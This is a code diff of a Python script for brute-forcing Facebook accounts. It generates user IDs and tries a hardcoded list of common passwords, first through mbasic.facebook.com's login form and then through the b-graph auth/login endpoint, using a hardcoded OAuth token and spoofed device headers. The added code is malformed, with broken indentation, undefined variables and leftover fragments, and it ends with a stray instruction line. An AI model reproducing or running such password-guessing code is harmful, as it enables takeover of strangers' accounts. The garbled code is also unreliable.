@@ -84,56 +84,59 @@ def Main():
 		print('<> CRACK STARTED....... ')
 		print(50*'━')
 		for guru in user:
-			uid = love+lova+lovb+guru
-			pwx = [lova+lovb+guru,love+lova+lovb,love+love,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070','free fire','freefire1234']
-			yaari.submit(test,uid,pwx,tl)
-	print(50*'━')
-	print(' <> CRACK DONE......... ')
-	print(50*'━')
-	exit()
-def test(uid,pwx,tl):
-    global loop
-    global cps    
-    global oks
-    global agents
+import os, uuid, random
+import requests as r
+
+def login():
+    os.system("clear")
+    print("\033[1;37m")
+    uid = love+lova+lovb+guru
+    pww = [lova+lovb+guru,love+lova+lovb,love+love,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070','free fire','freefire1234']
+    ua = "[FBAN/Orca-Android;FBAV/5.0.0.16.1;FBLC/tr_TR;FBBV/2302400;FBCR/ T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/GT-I9300;FBSV/4.0.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=1066,height=552};]"
+    check(uid, pww, ua)
+  
+  print(50*'━')
+  print(' <> CRACK DONE......... ')
+  print(50*'━')
+  exit()
+
+def check(uid, pww, ua):
     try:
-        for ps in pwx:
-            session = requests.Session()
-            sys.stdout.write(f'\r\033[1;90m[\033[1;92mRJ-404\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
-            sys.stdout.flush()
-            pro = random.choice(ugen)
-            free_fb = session.get('https://mbasic.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
-            'method': 'GET',
-            'path': '/login/device-based/login/async/',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
-            'cache-control': 'max-age=0',
-            'dpr': '2',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-ch-ua-platform-version': '""',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro}
+        data = {
+            "adid": str(uuid.uuid4()),
+            "device_id": str(uuid.uuid4()),
+            "email": uid,
+            "password": pww,
+            "cpl": "true",
+            "source": "device_based_login",
+            "format": "json",
+            "generate_session_cookies": "1",
+            "generate_analytic_claims": "1",
+            "generate_machine_id": "1",
+            "locale": "GB",
+            "country_code": "GB",
+            "client_country_code": "GB",
+            "currently_logged_in_userid": "0",
+        }
+        headers = {
+            "User-Agent": ua,
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+            "X-FB-Connection-Quality": "EXCELLENT",
+            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
+            "X-FB-HTTP-Engine": "Liger",
+        }
+        url = "https://b-graph.facebook.com/auth/login"
+        result = r.post(url, data=data, headers=headers).json()
+        print(result)
+    except:
+        pass
+
+login()
+
+email or password Laga Lo aur test kro
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
